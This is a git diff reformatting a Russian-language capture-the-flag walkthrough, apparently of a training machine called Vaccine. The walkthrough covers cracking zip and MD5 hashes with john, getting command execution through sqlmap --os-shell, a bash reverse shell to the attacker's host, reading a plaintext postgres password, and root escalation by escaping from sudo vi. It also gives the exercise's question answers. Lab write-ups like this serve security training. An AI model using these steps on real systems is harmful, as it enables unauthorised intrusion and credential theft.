@@ -58,52 +58,52 @@ ftp> ls
 ## Получение первоначального доступа (Initial Access)
 
 5. What is the password for the admin user on the website?
-Для того чтобы узнать пароль от пользователя admin, необходимо скачать файл backup.zip:
+* Для того чтобы узнать пароль от пользователя `admin`, необходимо скачать файл `backup.zip`:
+```TEXT
 ftp> get backup.zip
-
-Файл зашифрован, извлекаем хэш:
+```
+* Файл зашифрован, извлекаем хэш:
 ```bash
 zip2john backup.zip > zip_hash.txt
 ```
-
-Взламываем хэш с помощью john:
+* Взламываем хэш с помощью `john the ripper`:
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
 741852963        (backup.zip)
 ```
-
-Разархивируем скачанный архив с помощью найденного пароля и открываем файл index.php, нас интересует строчка:
+* Разархивируем скачанный архив с помощью найденного пароля и открываем файл `index.php`, нас интересует строчка:
 ```php
 if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
 ```
-
-Указан хэш пароля и тип шифрования, взламываем с помощью john:
+* Указан хэш пароля и тип шифрования, взламываем с помощью `john the ripper`:
 ```bash
 john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt
 ```
+
 Ответ: qwerty789
 
 ## Эксплуатация уязвимости (Exploitation)
 
 6. What option can be passed to sqlmap to try to get command execution via the sql injection?
+
 Ответ: --os-shell
 
 7. What program can the postgres user run as root using sudo?
-Для того чтобы узнать, какую программу может запускать пользователь postgres, необходимо под ним авторизоваться. Узнаем пароль.
+* Для того чтобы узнать, какую программу может запускать пользователь `postgres`, необходимо под ним авторизоваться. Узнаем пароль.
 
-Устанавливаем на прослушивание 444 порт на атакующей машине:
+* Устанавливаем на прослушивание `444` порт на атакующей машине:
 ```bash
 nc -lvnp 444
 ```
-С помощью sqlmap запускаем shell:
+* С помощью `sqlmap` запускаем `shell`:
 ```bash
 sqlmap -u "http://10.129.95.174/dashboard.php?search=1" --cookie="PHPSESSID=ji4lr6ibdfcfna11fbpe4qsurs" --os-shell
 ```
-Вводим скрипт для перехвата атакующей машиной:
+* Вводим скрипт для перехвата атакующей машиной:
 ```bash
 bash -c "bash -i >& /dev/tcp/ip атакующей машины/444 0>&1"
 ```
-Переводим шелл из неинтерактивного режима в интерактивный:
+* Переводим шелл из неинтерактивного режима в интерактивный:
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 CTRL+Z
@@ -111,29 +111,39 @@ stty raw -echo
 fg
 export TERM=xterm
 ```
-Теперь мы можем найти флаг в папке пользователя. Файл с флагом лежит по пути: /var/lib/postgresql/user.txt
+* Теперь мы можем найти флаг в папке пользователя. Файл с флагом лежит по пути:
+```TEXT
+/var/lib/postgresql/user.txt
+```
 
-Файл с паролем от postgres находится в каталоге /var/www/html/dashboard.php:
+Файл с паролем от `postgres` находится в каталоге:
+```TEXT
+/var/www/html/dashboard.php:
+```
 ```php
 $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
 ```
-Теперь можно заходить по SSH под пользователем postgres:
-Вводим команду sudo -l и узнаем, какую программу postgres может запускать с повышенными правами:
+* Теперь можно заходить по SSH под пользователем `postgres`:
+* Вводим команду `sudo -l` и узнаем, какую программу `postgres` может запускать с повышенными правами:
 
+```TEXT
 User postgres may run the following commands on vaccine:
 (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
 
 Ответ: vi
 
 ## Повышение привилегий (Privilege Escalation)
 
-8. Находим флаг пользователя root:
-Для этого необходимо повысить привилегии.
-Устанавливаем размеры терминала для корректного отображения:
+8. Находим флаг пользователя `root`:
+* Для этого необходимо повысить привилегии.
+* Устанавливаем размеры терминала для корректного отображения:
 ```bash
 stty rows 24 cols 80
 ```
-В открытом файле /etc/postgresql/11/main/pg_hba.conf в редакторе vi вводим:
+В открытом файле `/etc/postgresql/11/main/pg_hba.conf` в редакторе `vi` вводим:
+```TEXT
 set shell=/bin/sh
 shell
-Получаем права root. Флаг лежит в корне пользователя /root/root.txt.
+```
+Получаем права `root`. Флаг лежит в корне пользователя `/root/root.txt`.
